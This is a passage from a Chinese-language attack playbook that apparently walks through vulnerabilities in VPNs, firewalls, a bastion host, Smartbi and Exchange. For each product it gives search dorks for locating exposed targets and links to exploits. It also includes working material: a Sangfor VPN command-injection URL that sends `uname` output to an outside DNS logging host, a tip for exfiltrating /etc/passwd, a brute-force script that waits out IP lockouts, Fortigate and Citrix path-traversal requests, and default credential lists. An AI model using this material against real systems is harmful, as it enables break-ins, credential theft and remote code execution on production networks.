</span></span><span class="line"><span class="cl">    } else {
</span></span><span class="line"><span class="cl">        return 1;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>6. 漏洞利用</strong></p>
<p>这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了</p>
<p><strong>7. 利用技巧</strong></p>
<p>1.RMIServlet加解密代码</p>
<p>虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ENCODING_SCHEDULE = {
</span></span><span class="line"><span class="cl">    &#34;0&#34;: &#34;7&#34;, &#34;1&#34;: &#34;1&#34;, &#34;2&#34;: &#34;u&#34;, &#34;3&#34;: &#34;N&#34;, &#34;4&#34;: &#34;K&#34;, &#34;5&#34;: &#34;J&#34;, &#34;6&#34;: &#34;M&#34;, &#34;7&#34;: &#34;9&#34;, &#34;8&#34;: &#34;&#39;&#34;, &#34;9&#34;: &#34;m&#34;, &#34;!&#34;: &#34;P&#34;, 
</span></span><span class="line"><span class="cl">    &#34;%&#34;: &#34;/&#34;, &#34;&#39;&#34;: &#34;n&#34;, &#34;(&#34;: &#34;A&#34;, &#34;)&#34;: &#34;E&#34;, &#34;*&#34;: &#34;s&#34;, &#34;+&#34;: &#34;+&#34;, &#34;-&#34;: &#34;f&#34;, &#34;.&#34;: &#34;q&#34;, &#34;A&#34;: &#34;O&#34;, &#34;B&#34;: &#34;V&#34;, &#34;C&#34;: &#34;t&#34;, 
</span></span><span class="line"><span class="cl">    &#34;D&#34;: &#34;T&#34;, &#34;E&#34;: &#34;a&#34;, &#34;F&#34;: &#34;x&#34;, &#34;G&#34;: &#34;H&#34;, &#34;H&#34;: &#34;r&#34;, &#34;I&#34;: &#34;c&#34;, &#34;J&#34;: &#34;v&#34;, &#34;K&#34;: &#34;l&#34;, &#34;L&#34;: &#34;8&#34;, &#34;M&#34;: &#34;F&#34;, &#34;N&#34;: &#34;3&#34;, 
</span></span><span class="line"><span class="cl">    &#34;O&#34;: &#34;o&#34;, &#34;P&#34;: &#34;L&#34;, &#34;Q&#34;: &#34;Y&#34;, &#34;R&#34;: &#34;j&#34;, &#34;S&#34;: &#34;W&#34;, &#34;T&#34;: &#34;*&#34;, &#34;U&#34;: &#34;z&#34;, &#34;V&#34;: &#34;Z&#34;, &#34;W&#34;: &#34;!&#34;, &#34;X&#34;: &#34;B&#34;, &#34;Y&#34;: &#34;)&#34;, 
</span></span><span class="line"><span class="cl">    &#34;Z&#34;: &#34;U&#34;, &#34;a&#34;: &#34;(&#34;, &#34;b&#34;: &#34;~&#34;, &#34;c&#34;: &#34;i&#34;, &#34;d&#34;: &#34;h&#34;, &#34;e&#34;: &#34;p&#34;, &#34;f&#34;: &#34;_&#34;, &#34;g&#34;: &#34;-&#34;, &#34;h&#34;: &#34;I&#34;, &#34;i&#34;: &#34;R&#34;, &#34;j&#34;: &#34;.&#34;, 
</span></span><span class="line"><span class="cl">    &#34;k&#34;: &#34;G&#34;, &#34;l&#34;: &#34;S&#34;, &#34;m&#34;: &#34;d&#34;, &#34;n&#34;: &#34;6&#34;, &#34;o&#34;: &#34;w&#34;, &#34;p&#34;: &#34;5&#34;, &#34;q&#34;: &#34;0&#34;, &#34;r&#34;: &#34;4&#34;, &#34;s&#34;: &#34;D&#34;, &#34;t&#34;: &#34;k&#34;, &#34;u&#34;: &#34;Q&#34;, 
</span></span><span class="line"><span class="cl">    &#34;v&#34;: &#34;g&#34;, &#34;w&#34;: &#34;b&#34;, &#34;x&#34;: &#34;C&#34;, &#34;y&#34;: &#34;2&#34;, &#34;z&#34;: &#34;X&#34;, &#34;~&#34;: &#34;e&#34;, &#34;_&#34;: &#34;y&#34;, 
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECODING_SCHEDULE = {
</span></span><span class="line"><span class="cl">    &#34;7&#34;: &#34;0&#34;, &#34;1&#34;: &#34;1&#34;, &#34;u&#34;: &#34;2&#34;, &#34;N&#34;: &#34;3&#34;, &#34;K&#34;: &#34;4&#34;, &#34;J&#34;: &#34;5&#34;, &#34;M&#34;: &#34;6&#34;, &#34;9&#34;: &#34;7&#34;, &#34;&#39;&#34;: &#34;8&#34;, &#34;m&#34;: &#34;9&#34;, &#34;P&#34;: &#34;!&#34;, 
</span></span><span class="line"><span class="cl">    &#34;/&#34;: &#34;%&#34;, &#34;n&#34;: &#34;&#39;&#34;, &#34;A&#34;: &#34;(&#34;, &#34;E&#34;: &#34;)&#34;, &#34;s&#34;: &#34;*&#34;, &#34;+&#34;: &#34;+&#34;, &#34;f&#34;: &#34;-&#34;, &#34;q&#34;: &#34;.&#34;, &#34;O&#34;: &#34;A&#34;, &#34;V&#34;: &#34;B&#34;, &#34;t&#34;: &#34;C&#34;, 
</span></span><span class="line"><span class="cl">    &#34;T&#34;: &#34;D&#34;, &#34;a&#34;: &#34;E&#34;, &#34;x&#34;: &#34;F&#34;, &#34;H&#34;: &#34;G&#34;, &#34;r&#34;: &#34;H&#34;, &#34;c&#34;: &#34;I&#34;, &#34;v&#34;: &#34;J&#34;, &#34;l&#34;: &#34;K&#34;, &#34;8&#34;: &#34;L&#34;, &#34;F&#34;: &#34;M&#34;, &#34;3&#34;: &#34;N&#34;, 
</span></span><span class="line"><span class="cl">    &#34;o&#34;: &#34;O&#34;, &#34;L&#34;: &#34;P&#34;, &#34;Y&#34;: &#34;Q&#34;, &#34;j&#34;: &#34;R&#34;, &#34;W&#34;: &#34;S&#34;, &#34;*&#34;: &#34;T&#34;, &#34;z&#34;: &#34;U&#34;, &#34;Z&#34;: &#34;V&#34;, &#34;!&#34;: &#34;W&#34;, &#34;B&#34;: &#34;X&#34;, &#34;)&#34;: &#34;Y&#34;, 
</span></span><span class="line"><span class="cl">    &#34;U&#34;: &#34;Z&#34;, &#34;(&#34;: &#34;a&#34;, &#34;~&#34;: &#34;b&#34;, &#34;i&#34;: &#34;c&#34;, &#34;h&#34;: &#34;d&#34;, &#34;p&#34;: &#34;e&#34;, &#34;_&#34;: &#34;f&#34;, &#34;-&#34;: &#34;g&#34;, &#34;I&#34;: &#34;h&#34;, &#34;R&#34;: &#34;i&#34;, &#34;.&#34;: &#34;j&#34;, 
</span></span><span class="line"><span class="cl">    &#34;G&#34;: &#34;k&#34;, &#34;S&#34;: &#34;l&#34;, &#34;d&#34;: &#34;m&#34;, &#34;6&#34;: &#34;n&#34;, &#34;w&#34;: &#34;o&#34;, &#34;5&#34;: &#34;p&#34;, &#34;0&#34;: &#34;q&#34;, &#34;4&#34;: &#34;r&#34;, &#34;D&#34;: &#34;s&#34;, &#34;k&#34;: &#34;t&#34;, &#34;Q&#34;: &#34;u&#34;, 
</span></span><span class="line"><span class="cl">    &#34;g&#34;: &#34;v&#34;, &#34;b&#34;: &#34;w&#34;, &#34;C&#34;: &#34;x&#34;, &#34;2&#34;: &#34;y&#34;, &#34;X&#34;: &#34;z&#34;, &#34;e&#34;: &#34;~&#34;, &#34;y&#34;: &#34;_&#34;, 
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#此函数可以用来加密明文也可以解密服务器返回的密文
</span></span><span class="line"><span class="cl">def encode(code):
</span></span><span class="line"><span class="cl">    out = &#34;&#34;
</span></span><span class="line"><span class="cl">    for item in code:
</span></span><span class="line"><span class="cl">        out = out + ENCODING_SCHEDULE.get(item, item)
</span></span><span class="line"><span class="cl">    return out
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def decode(code):
</span></span><span class="line"><span class="cl">    out = &#34;&#34;
</span></span><span class="line"><span class="cl">    for item in code:
</span></span><span class="line"><span class="cl">        out = out + DECODING_SCHEDULE.get(item, item)
</span></span><span class="line"><span class="cl">    return out
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.该系统还有几处漏洞, 比如默认口令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">demo/demo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">manager/demo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">admin/admin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">admin/manager
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">admin/2manager
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.默认路径</p>
<p><code>http://127.0.0.1:18080/smartbi/vision/config.jsp</code> 可能未修改密码或者密码为<code>manager</code></p>
<p>4.进入后台目录遍历</p>
<p><code>http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=C%3A%2F</code></p>
<p>同样是后台可以加载插件, 怎么getshell不用我多说了吧</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.使用强口令</p>
<p>3.版本最好为最新版8.5以上, v7还有其他漏洞</p>
<h2 id="第二节">第二节</h2>
<blockquote>
<p>本节主要是针对网络边界产品, VPN, 防火墙, 邮箱一类的相关漏洞, 属于典型灯下黑的情况, 厂商可能会忘记, 但是攻击者不会放过一丝一毫</p>
</blockquote>
<h2 id="深信服vpn远程代码执行">深信服VPN远程代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</p>
<p><strong>2. 影响组件</strong>
深信服 VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Set-Cookie: TWFID=</code></p>
<p><code>welcome to ssl vpn</code></p>
<p><code>Sinfor</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>header=&quot;Set-Cookie: TWFID=&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>深信服vpnweb登录逆向学习 – potatso – 博客园
<a class="link" href="https://www.cnblogs.com/potatsoSec/p/12326356.html"  target="_blank" rel="noopener"
    >https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p><code>wget -t %d -T %d --spider %s</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">/</span><span class="mi">123</span><span class="p">.</span><span class="mi">123</span><span class="p">.</span><span class="mi">123</span><span class="p">.</span><span class="mi">123</span><span class="o">/</span><span class="n">por</span><span class="o">/</span><span class="n">checkurl</span><span class="p">.</span><span class="n">csp</span><span class="o">?</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">retry</span><span class="o">=</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">url</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">admin</span><span class="p">.</span><span class="n">ceye</span><span class="p">.</span><span class="n">io</span><span class="o">/`</span><span class="n">uname</span><span class="o">`</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>7. 利用技巧</strong></p>
<p>1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网</p>
<p>2.该版本较低, <code>whomai</code>不存在, 可以使用 <code>uname</code>, 这里没有空格可dns传出来</p>
<p>3.去除空格也简单 <code>cat /etc/passwd | tr &quot; \n&quot; &quot;+|&quot;</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="深信服-vpn-口令爆破">深信服 VPN 口令爆破</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行</p>
<p><strong>2. 影响组件</strong>
深信服 VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>/por/login_auth.csp?apiversion=1</code></p>
<p><code>sangfor</code></p>
<p><code>/cgi-bin/login.cgi?rnd=</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;深信服-SSL-VPN&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区
<a class="link" href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633"  target="_blank" rel="noopener"
    >https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=20633</a></p>
<p>此处存疑, 时间问题没有测试</p>
<p><strong>6. 漏洞利用</strong></p>
<p>1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#encoding=utf8
</span></span><span class="line"><span class="cl">import requests
</span></span><span class="line"><span class="cl">import hashlib
</span></span><span class="line"><span class="cl">import urllib3
</span></span><span class="line"><span class="cl">urllib3.disable_warnings()
</span></span><span class="line"><span class="cl">import re
</span></span><span class="line"><span class="cl">session = requests.session()
</span></span><span class="line"><span class="cl">def SanForLogin(target, password, username=&#34;admin&#34;):
</span></span><span class="line"><span class="cl">    burp0_url = target +&#34;/cgi-bin/login.cgi?rnd=&#34;
</span></span><span class="line"><span class="cl">    burp0_headers = {&#34;User-Agent&#34;: &#34;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&#34;}
</span></span><span class="line"><span class="cl">    r1 = session.get(burp0_url, verify=False)
</span></span><span class="line"><span class="cl">    sid = r1.cookies[&#34;sinfor_session_id&#34;]
</span></span><span class="line"><span class="cl">    Epassword = hashlib.sha1(password+sid).hexdigest()
</span></span><span class="line"><span class="cl">    burp0_data = {&#34;user&#34;: username, &#34;password&#34;: Epassword, &#34;logintime&#34;: &#34;2&#34;, &#34;program&#34;: &#34;3&#34;, &#34;language&#34;: &#34;zh_CN&#34;}
</span></span><span class="line"><span class="cl">    r2 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
</span></span><span class="line"><span class="cl">    r2.encoding=&#34;UTF-8&#34;
</span></span><span class="line"><span class="cl">    if r2.status_code==200 and &#34;&lt;TITLE&gt;Loading...&lt;/TITLE&gt;&#34; in r2.text:
</span></span><span class="line"><span class="cl">        print(&#34;Success! admin password is &#34;, password)
</span></span><span class="line"><span class="cl">        print(r2.cookies[&#34;sinfor_session_id&#34;])
</span></span><span class="line"><span class="cl">        return password
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        for x in re.findall(&#34;var loginInfo = \&#34;.*?\&#34;&#34;, r2.text):
</span></span><span class="line"><span class="cl">            print(x)
</span></span><span class="line"><span class="cl">            if &#34;IP&#34; in x:
</span></span><span class="line"><span class="cl">                print(&#34;IP lock wait for 5 mins&#34;)
</span></span><span class="line"><span class="cl">                time.sleep(305)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SanForLogin(&#34;https://xxxxxxxxxxx/&#34;, &#34;admin&#34;)
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>7. 利用技巧</strong></p>
<p>1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多</p>
<p>国外APT组织应该也批量爆破了一波</p>
<p>加密的密码也就是 <code>sha1(password+sid)</code></p>
<p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些</p>
<p><code>admin/123456/Sangfor/Sangfor@123</code></p>
<p>2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能</p>
<p>3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧</p>
<p>深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全
<a class="link" href="https://www.uedbox.com/post/31092/"  target="_blank" rel="noopener"
    >https://www.uedbox.com/post/31092/</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="fortigate-ssl-vpn-文件读取远程代码执行">Fortigate SSL VPN 文件读取/远程代码执行</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞</p>
<p><strong>2. 影响组件</strong>
Fortigate SSL VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Fortigate</code></p>
<p><code>4tinet2095866</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>&quot;Fortigate&quot; &amp;&amp; port=10443</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN
<a class="link" href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1"  target="_blank" rel="noopener"
    >https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>密码读取</p>
<p>milo2012/CVE-2018-13379: CVE-2018-13379
<a class="link" href="https://github.com/milo2012/CVE-2018-13379"  target="_blank" rel="noopener"
    >https://github.com/milo2012/CVE-2018-13379</a></p>
<p>任意密码重置, 这肯定是个后门</p>
<p>milo2012/CVE-2018-13382: CVE-2018-13382
<a class="link" href="https://github.com/milo2012/CVE-2018-13382"  target="_blank" rel="noopener"
    >https://github.com/milo2012/CVE-2018-13382</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.文件读取的路径构造</p>
<p><code>https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</code></p>
<p>如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd</p>
<p><code>print(&quot;/../../../../&quot;+(raw_input().rjust(35, '/')))</code></p>
<p>2.寻找魔术数字</p>
<p>虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,</p>
<p><code>https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd</code></p>
<p>后来发现这个字符串在js里面也有, 直接从前台分析也可以获得</p>
<p><code>https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="pulse-secure-ssl-vpn远程代码执行漏洞">Pulse Secure SSL VPN远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p>
<p><strong>2. 影响组件</strong></p>
<p>Pulse Secure SSL VPN</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Pulse Secure SSL VPN</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;PulseSecure-SSL-VPN&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/185773"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/185773</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)
<a class="link" href="https://github.com/projectzeroindia/CVE-2019-11510"  target="_blank" rel="noopener"
    >https://github.com/projectzeroindia/CVE-2019-11510</a></p>
<p>0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect
<a class="link" href="https://github.com/0xDezzy/CVE-2019-11539"  target="_blank" rel="noopener"
    >https://github.com/0xDezzy/CVE-2019-11539</a></p>
<p><strong>7. 利用技巧</strong></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="palo-alto-globalprotect-vpn远程代码执行漏洞">Palo Alto GlobalProtect VPN远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞</p>
<p><strong>2. 影响组件</strong>
Palo Alto GlobalProtect</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>GlobalProtect Portal</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;PaloAlto-GlobalProtect&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!
<a class="link" href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html"  target="_blank" rel="noopener"
    >https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a></p>
<p>Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园
<a class="link" href="https://www.cnblogs.com/backlion/p/11209054.html"  target="_blank" rel="noopener"
    >https://www.cnblogs.com/backlion/p/11209054.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>securifera/CVE-2019-1579
<a class="link" href="https://github.com/securifera/CVE-2019-1579"  target="_blank" rel="noopener"
    >https://github.com/securifera/CVE-2019-1579</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个扫描的话可以判断</p>
<p><code>/global-protect/portal/css/login.css</code>
<code>/images/logo_pan_158.gif</code></p>
<p><code>Last-Modified</code> 是否早于于2018年</p>
<p><code>curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified</code></p>
<p><code>Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<h2 id="citrix-gatewayadc-远程代码执行漏洞-cve-2019-19781">Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)</p>
<p><strong>2. 影响组件</strong></p>
<p>Citrix Gateway/ADC</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Citrix Gateway/ADC</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Citrix-Netscaler&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台
<a class="link" href="https://www.freebuf.com/news/232752.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/news/232752.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.
<a class="link" href="https://github.com/trustedsec/cve-2019-19781"  target="_blank" rel="noopener"
    >https://github.com/trustedsec/cve-2019-19781</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.通过以下命令可以快速断定</p>
<p><code>curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure</code></p>
<p>这里部分版本不需要进行<code>../</code>跳转也可以, 具体原因没有分析</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<p>3.暂时屏蔽未授权用户对/vpns/路径的访问</p>
<h2 id="齐治堡垒机相关漏洞">齐治堡垒机相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写</p>
<p><strong>2. 影响组件</strong>
齐治堡垒机</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>shterm</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;shterm-堡垒机&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>审计某系统从解密到GetShell – 云+社区 – 腾讯云
<a class="link" href="https://cloud.tencent.com/developer/article/1448700"  target="_blank" rel="noopener"
    >https://cloud.tencent.com/developer/article/1448700</a></p>
<p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记
<a class="link" href="http://kfbiji.com/article/65b98114903248eb"  target="_blank" rel="noopener"
    >http://kfbiji.com/article/65b98114903248eb</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记
<a class="link" href="http://kfbiji.com/article/65b98114903248eb"  target="_blank" rel="noopener"
    >http://kfbiji.com/article/65b98114903248eb</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.齐治堡垒机默认口令:<code>shterm/shterm</code></p>
<p>2.普通用户获取堡垒机权限, 登录之后可尝试命令注入</p>
<p>如果有类似chrome的应用可以直接使用<code>ctrl+o</code>打开窗口, 然后新建bat, 起一个cmd或者其他的程序</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.升级到最新版</p>
<p>3.做好权限控制</p>
<h2 id="exchange-相关漏洞">Exchange 相关漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)</p>
<p><strong>2. 影响组件</strong>
Exchange</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>Exchange</code></p>
<p><code>outlook</code></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Microsoft-Exchange&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台
<a class="link" href="https://www.freebuf.com/vuls/195162.html"  target="_blank" rel="noopener"
    >https://www.freebuf.com/vuls/195162.html</a></p>
<p>Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析
<a class="link" href="https://paper.seebug.org/804/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/804/</a></p>
<p>微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7299"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7299</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Ridter/Exchange2domain: CVE-2018-8581
<a class="link" href="https://github.com/Ridter/Exchange2domain"  target="_blank" rel="noopener"
    >https://github.com/Ridter/Exchange2domain</a></p>
<p>Ridter/cve-2020-0688: cve-2020-0688
<a class="link" href="https://github.com/Ridter/cve-2020-0688"  target="_blank" rel="noopener"
    >https://github.com/Ridter/cve-2020-0688</a></p>
<p>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters
<a class="link" href="https://github.com/pwntester/ysoserial.net"  target="_blank" rel="noopener"
    >https://github.com/pwntester/ysoserial.net</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.寻找企业的Exchange有个技巧</p>
<p>除了访问以下域名或者直接查找 <code>DNS MX</code> 记录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
